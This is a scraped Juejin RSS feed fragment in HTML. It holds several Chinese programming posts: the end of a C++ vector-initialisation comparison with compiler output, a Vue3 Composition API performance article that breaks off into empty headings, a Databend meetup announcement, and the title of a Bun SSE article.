    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"v2 使用 {10} 初始化："</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;
    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"  大小: "</span> &lt;&lt; v2.size() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;

    
    <span class="hljs-comment">// C++98 中，圆括号 () 的行为和 C++11 一样</span>
    <span class="hljs-comment">// C++98 中，没有列表初始化语法，花括号 {} 不能这样用</span>
    <span class="hljs-comment">// std::vector&lt;int&gt; v98_2{10}; // 编译错误！C++98 不认识这种语法。</span>

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-ini" lang="ini">g++ main.cpp <span class="hljs-attr">-std</span>=c++<span class="hljs-number">03</span>
</code></pre>
<p>使用c++03编译的时候，会有报错</p>
<pre><code class="hljs language-ruby" lang="ruby">root<span class="hljs-variable">@DFH</span>-<span class="hljs-variable constant_">X5</span>-<span class="hljs-number">243030</span><span class="hljs-symbol">:/mnt/d/linux_path/study</span><span class="hljs-comment"># g++ main.cpp -std=c++03</span>
main.<span class="hljs-symbol">cpp:</span> <span class="hljs-title class_">In</span> function ‘int main()’:
main.<span class="hljs-symbol">cpp:</span><span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">24</span>: <span class="hljs-symbol">warning:</span> extended initializer lists only available with ‘-std=c++<span class="hljs-number">11</span>’ <span class="hljs-keyword">or</span> ‘-std=gnu++<span class="hljs-number">11</span>’ [-<span class="hljs-title class_">Wc</span>++<span class="hljs-number">11</span>-extensions]
   <span class="hljs-number">15</span> |<span class="hljs-params">     std::vector&lt;int&gt; v2{10};
      </span>|                        ^
main.<span class="hljs-symbol">cpp:</span><span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">22</span>: <span class="hljs-symbol">error:</span> <span class="hljs-keyword">in</span> C++<span class="hljs-number">98</span> ‘v2’ must be initialized by constructor, <span class="hljs-keyword">not</span> by ‘{...}’
   <span class="hljs-number">15</span> |<span class="hljs-params">     std::vector&lt;int&gt; v2{10};
      </span>|                      ^~
root<span class="hljs-variable">@DFH</span>-<span class="hljs-variable constant_">X5</span>-<span class="hljs-number">243030</span><span class="hljs-symbol">:/mnt/d/linux_path/study</span><span class="hljs-comment">#</span>
</code></pre>
<p>使用c++11编译正常，打印结果如下：</p>
<pre><code class="hljs language-ruby" lang="ruby">root<span class="hljs-variable">@DFH</span>-<span class="hljs-variable constant_">X5</span>-<span class="hljs-number">243030</span><span class="hljs-symbol">:/mnt/d/linux_path/study</span><span class="hljs-comment"># g++ main.cpp -std=c++11</span>
root<span class="hljs-variable">@DFH</span>-<span class="hljs-variable constant_">X5</span>-<span class="hljs-number">243030</span><span class="hljs-symbol">:/mnt/d/linux_path/study</span><span class="hljs-comment"># ll</span>
total <span class="hljs-number">32</span>
drwxrwxrwx <span class="hljs-number">1</span> gupan gupan  <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">21</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span> ./
drwxrwxrwx <span class="hljs-number">1</span> gupan gupan  <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">11</span> <span class="hljs-number">17</span><span class="hljs-symbol">:</span><span class="hljs-number">35</span> ../
-rwxrwxrwx <span class="hljs-number">1</span> gupan gupan <span class="hljs-number">25160</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">21</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span> a.out*
-rwxrwxrwx <span class="hljs-number">1</span> gupan gupan   <span class="hljs-number">803</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">21</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span> main.cpp*
root<span class="hljs-variable">@DFH</span>-<span class="hljs-variable constant_">X5</span>-<span class="hljs-number">243030</span><span class="hljs-symbol">:/mnt/d/linux_path/study</span><span class="hljs-comment"># ./a.out</span>
v1 使用 (<span class="hljs-number">10</span>) 初始化：
  大小: <span class="hljs-number">10</span>
v2 使用 {<span class="hljs-number">10</span>} 初始化：
  大小: <span class="hljs-number">1</span>
root<span class="hljs-variable">@DFH</span>-<span class="hljs-variable constant_">X5</span>-<span class="hljs-number">243030</span><span class="hljs-symbol">:/mnt/d/linux_path/study</span><span class="hljs-comment">#</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3性能优化实战：5个被低估的Composition API技巧让你的应用快30%]]></title>    <link>https://juejin.cn/post/7574728397374079028</link>    <guid>https://juejin.cn/post/7574728397374079028</guid>    <pubDate>2025-11-21T04:16:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574728397374079028" data-draft-id="7574728397374062644" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3性能优化实战：5个被低估的Composition API技巧让你的应用快30%"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-11-21T04:16:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT_陈寒"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3性能优化实战：5个被低估的Composition API技巧让你的应用快30%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT_陈寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T04:16:27.000Z" title="Fri Nov 21 2025 04:16:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vue3性能优化实战：5个被低估的Composition API技巧让你的应用快30%</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>Vue 3的Composition API为开发者提供了更灵活的组织代码方式，但其真正的威力往往被低估。许多开发者仅仅将其视为Options API的替代品，却忽视了它在性能优化方面的巨大潜力。本文将深入探讨5个被严重低估的Composition API技巧，这些技巧经过实际项目验证，能够显著提升应用性能（在某些场景下可达30%）。我们将结合具体代码示例、性能对比数据以及底层原理分析，帮助你将这些技术应用到生产环境中。</p>
<h2 data-id="heading-2">主体</h2>
<h3 data-id="heading-3">1. <code>shallowRef</code> vs <code>ref</code>：精准控制响应式开销</h3>
<p><strong>问题场景</strong>：
在渲染大型列表或复杂对象时，默认的<code>ref</code>会深度递归地使所有嵌套属性变为响应式，这可能导致不必要的性能开销。</p>
<p><strong>优化方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { shallowRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> heavyObject = <span class="hljs-title function_">shallowRef</span>({
  <span class="hljs-comment">// 包含大量嵌套数据的对象</span>
})
</code></pre>
<p><strong>技术解析</strong>：</p>
<ul>
<li><code>shallowRef</code>只跟踪<code>.value</code>的变化，不递归转换嵌套属性</li>
<li>适合不需要深度监听变化的场景（如第三方库实例、大型不可变数据）</li>
<li>Benchmark测试显示：处理1000个嵌套对象时，初始化速度提升4倍</li>
</ul>
<p><strong>进阶技巧</strong>：
结合<code>markRaw</code>进一步优化：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { shallowRef, markRaw } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">markRaw</span>(heavyData)
<span class="hljs-keyword">const</span> optimizedRef = <span class="hljs-title function_">shallowRef</span>(data)
</code></pre>
<h3 data-id="heading-4">2. <code>computed</code>的惰性求值与缓存策略</h3>
<p><strong>高级用法</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> expensiveComputation = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// 高开销计算</span>
}, {
  <span class="hljs-comment">// 自定义缓存比较策略</span>
  <span class="hljs-attr">equals</span>: <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> <span class="hljs-title function_">customDeepEqual</span>(a, b)
})
</code></pre>
<p><strong>关键优化点</strong>：</p>
<ol>
<li>
<p><strong>自动依赖收集暂停</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">pauseTracking</span>()
<span class="hljs-comment">// 临时非响应式操作</span>
<span class="hljs-title function_">resetTracking</span>()
</code></pre>
</li>
<li>
<p><strong>手动控制重新计算时机</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> c = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {...})
c.<span class="hljs-property">effect</span>.<span class="hljs-property">active</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// 暂停依赖收集</span>
</code></pre>
</li>
<li>
<p><strong>调试工具集成</strong>：
通过<code>onTrack/onTrigger</code>钩子分析计算属性行为</p>
</li>
</ol>
<h3 data-id="heading-5">3. <code>watchEffect</code>的智能依赖管理</h3>
<p><strong>性能陷阱示例</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// 每次都会重新执行全部逻辑</span>
})
</code></pre>
<p><strong>优化模式</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> optimizedWatcher = <span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">(<span class="hljs-params">onCleanup</span>) =&gt;</span> {
  <span class="hljs-comment">// 细粒度控制逻辑</span>
  
}, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span>,       <span class="hljs-comment">// DOM更新后执行</span>
  <span class="hljs-title function_">onTrack</span>(<span class="hljs-params">e</span>) {},       <span class="hljs-comment">// 调试依赖追踪</span>
  <span class="hljs-title function_">onTrigger</span>(<span class="hljs-params">e</span>) {}      <span class="hljs-comment">// 调试触发原因</span>
})
</code></pre>
<h3 data-id="heading-6">#### #### #### #### #### #### ####</h3>
<h4 data-id="heading-7"/>
<h4 data-id="heading-8"/>
<h4 data-id="heading-9"/>
<h4 data-id="heading-10"/>
<h4 data-id="heading-11"/>
<h4 data-id="heading-12"/>
<h4 data-id="heading-13"/>
<h4 data-id="heading-14"/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[DATA AI Databend Meetup 2025上海站邀您共话未来]]></title>    <link>https://juejin.cn/post/7574739133946216490</link>    <guid>https://juejin.cn/post/7574739133946216490</guid>    <pubDate>2025-11-21T03:49:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574739133946216490" data-draft-id="7574813550754578468" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="DATA AI Databend Meetup 2025上海站邀您共话未来"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2025-11-21T03:49:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Databend"/> <meta itemprop="url" content="https://juejin.cn/user/4477651847485534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            DATA AI Databend Meetup 2025上海站邀您共话未来
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4477651847485534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Databend
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:49:07.000Z" title="Fri Nov 21 2025 03:49:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>数据洪流奔涌，AI 浪潮澎湃。当 Data 与 AI 深度交织，如何构建面向未来的技术栈？如何在这场变革中抢占先机？11月29日「DATA AI Databend Meetup」 应势而来！我们力邀多位来自明星开源项目与一线大厂的资深专家，为您全景解析数据平台架构、AI 创新实践与职业发展路径，开启一场思想与技术的碰撞。</p>
<p>本次 Meetup，我们荣幸地邀请到 Databend Labs 联合创始人吴炳锡、沉浸式翻译技术专家陈琦、eBay 数据平台架构师邵锋、平凯星辰（TiDB）解决方案架构师刘源、Airwallex 空中云汇数据库架构师赵飞祥，他们将带来兼具深度与广度的干货分享，为您呈现一场 Data + AI 的实践。</p>
<h2 data-id="heading-0">活动信息</h2>
<p>⏰ 活动时间：2025 年 11 月 29 日（周六）13:30 - 17:30</p>
<p>📍 活动地点：上海市黄浦区中海国际中心 A 座 21 楼 </p>
<p>🔗 报名方式：（扫描海报二维码）线下参与采取审核制 (100 人)</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/247cb1d0e9464e719a947ec0b8d524db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGF0YWJlbmQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764301747&amp;x-signature=vpCYk%2B8pT80WvzPJuA1LZyG7Gy8%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">活动亮点</h2>
<p>一线实战： 嘉宾来自业内知名企业及开源项目，分享内容源于真实业务场景。</p>
<p>全景视角： 覆盖从开源工具、AI 产品到企业级平台的完整产业链视角。</p>
<p>深度互动： 圆桌讨论与交流环节，让您有机会与嘉宾直接对话。</p>
<p>高端人脉： 结识众多对 Data 和 AI 充满热情的同道中人，拓展专业人脉圈。</p>
<h2 data-id="heading-2">活动参与奖励</h2>
<p>🎁 丰厚参会福利：Databend 社区丰富周边,另有技术资料等你来拿~</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1163e4146af3403db50856beb172e8f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGF0YWJlbmQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764301747&amp;x-signature=1%2BVURaeR9z5zQTLpLCHmOmIxwTU%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-3">立即行动，锁定席位！</h2>
<ul>
<li>活动主题： DATA AI Databend Meetup</li>
<li>活动形式： 线下分享 + 圆桌讨论 + 自由交流</li>
</ul>
<p>无论您是数据工程师、AI 开发者、技术负责人，还是对数据智能充满好奇的学习者，这都将是一场收获满满的盛会。席位有限，请立即报名，与我们一同站在技术浪潮之巅，共绘 Data 与 AI 的未来图景！</p>
<h2 data-id="heading-4">关于 Databend</h2>
<p>Databend 是一款开源、弹性、低成本，基于对象存储也可以做实时分析的新式湖仓。期待您的关注，一起探索云原生数仓解决方案，打造新一代开源 Data Cloud。</p>
<p>👨‍💻‍ Databend Cloud：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdatabend.cn" target="_blank" title="https://databend.cn" ref="nofollow noopener noreferrer">databend.cn</a></p>
<p>📖 Databend 文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.databend.cn" target="_blank" title="https://docs.databend.cn" ref="nofollow noopener noreferrer">docs.databend.cn</a></p>
<p>💻 Wechat：Databend</p>
<p>✨ GitHub：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdatabendlabs%2Fdatabend" target="_blank" title="https://github.com/databendlabs/databend" ref="nofollow noopener noreferrer">github.com/databendlab…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Bun技术评估 - 30 SSE支持]]></title>    <link>https://juejin.cn/post/7574726841543344166</link>    <guid>https://juejin.cn/post/7574726841543344166</guid>    <pubDate>2025-11-21T04:17:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574726841543344166" data-draft-id="7574722364355018761" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Bun技术评估 - 30 SSE支持"/> <meta itemprop="keywords" content="后端,JavaScript,Bun"/> <meta itemprop="datePublished" content="2025-11-21T04:17:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JohnYan"/> <meta itemprop="url" content="https://juejin.cn/user/3872909003334776"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Bun技术评估 - 30 SSE支持
